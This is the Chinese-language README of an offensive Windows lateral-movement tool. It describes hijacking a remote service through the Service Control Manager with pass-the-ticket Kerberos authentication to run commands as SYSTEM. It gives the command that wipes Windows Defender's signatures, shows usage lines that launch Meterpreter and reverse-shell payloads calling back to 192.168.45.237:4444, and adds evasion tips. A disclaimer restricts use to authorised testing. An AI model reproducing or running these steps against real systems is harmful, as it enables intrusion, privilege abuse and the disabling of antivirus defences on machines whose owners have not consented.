## **免责声明**

本工具仅供安全研究和授权测试使用，使用者须遵守当地法律法规并获得合法授权。对于任何未经授权的非法使用，开发者不承担任何责任。

---

## 技术原理

- **远程服务劫持**：通过 `OpenSCManager` 连接到目标主机的服务控制管理器（SCM），使用 `OpenService` 打开指定服务，调用 `ChangeServiceConfigA` 修改服务的二进制路径为任意命令，最后利用 `StartService` 远程启动服务，使 payload 以 SYSTEM 权限在目标主机执行。
- **票据传递（Pass‑the‑Ticket）** ：依赖当前会话中已获得的 Kerberos 服务票据（如 CIFS 或 HOST TGS）完成对目标主机 SCM 的认证，无需明文凭证或 NTLM 哈希。
- **绕过 Windows Defender**：在执行最终 payload 前，先修改服务路径为 `"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All` 并启动，临时清除 Defender 所有病毒签名，避免后续 Meterpreter 或 Shell 流量被网络检测功能拦截。
- **服务超时容错**：由于非标准服务程序不会向 SCM 报告状态，`StartService` 将返回错误 1053（服务未响应），这是正常现象，恶意命令已在超时前成功运行。

## 使用场景

- 已通过约束委派、票据注入等方式获得目标主机的有效服务票据，但无法直接登录或执行程序，需要借助服务劫持实现横向移动。
- 需要在目标主机以 SYSTEM 权限执行任意命令（如 Meterpreter 反连、Shell 等），并希望绕过 Windows Defender 实时保护及网络签名检测。

---

## 用法

```cmd
lat64.exe <目标主机> <服务名> <完整命令行>
```

参数说明：

- **目标主机**：远程计算机名或 IP 地址。
- **服务名**：目标主机上已存在且可被修改的非关键服务（如 `SensorService`）。
- **完整命令行**：要在目标主机上执行的完整命令（包括可执行文件路径及参数），若路径包含空格，需在命令外层添加双引号。

示例（在 PowerShell 中执行）：

```powershell
# 利用当前凭证在file01上启动 C:\Met64Inject.exe，参数为 IP 、端口、被注入的进程
C:\windows\temp\lat64.exe file01 SensorService "`"C:\Met64Inject.exe`" 192.168.45.237 4444 Spoolsv"

# 利用当前凭证在file01上启动 met64_tcp.exe，参数为 IP 和端口
C:\windows\temp\lat64.exe file01 SensorService "C:\shell64_tcp.exe 192.168.45.237 4444"
```

执行后，工具将自动先清除 Defender 签名，等待 10 秒，再启动最终 payload。

---

## 编译

```cmd
csc /out:lat64.exe lat.cs
```

架构无特殊要求，默认编译为 64 位即可。

---

## 注意事项

- 需要对目标主机的 SCM 和指定服务具有管理权限（通常依赖已有的 SYSTEM 票据）。
- `MpCmdRun.exe` 默认位于 `C:\Program Files\Windows Defender\`，如不在该路径可修改源码。
- 频繁修改同一服务可能触发 Windows Defender 行为监测，导致服务被禁用，建议在单次操作中完成。
- 使用前请确保 payload 文件已放置到目标主机的正确路径下（可通过 `C$` 等共享提前拷贝）。
